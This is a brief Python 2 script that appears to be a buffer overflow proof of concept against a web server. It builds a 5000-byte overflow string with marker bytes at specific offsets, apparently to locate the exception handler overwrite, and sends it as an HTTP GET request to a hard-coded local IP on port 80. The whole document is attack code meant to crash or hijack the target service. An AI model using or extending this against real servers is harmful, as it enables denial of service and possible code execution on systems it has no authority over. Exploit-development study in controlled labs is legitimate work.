#!/usr/bin/python
import socket
import os
import sys

buff = "A" * 4059 + "B" * 4 + "C" * 4
buff+="A" * (4183 - len(buff))
buff+= "D" * 4
buff+="A" * (5000-len(buff))


try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',80))
    print "Sending paylaod..........."
    s.send(("GET " + buff + " HTTP/1.0\r\n\r\n"))
    s.recv(1024)
    s.close()

except: 
     print("Unable to connect.......")
     sys.exit()     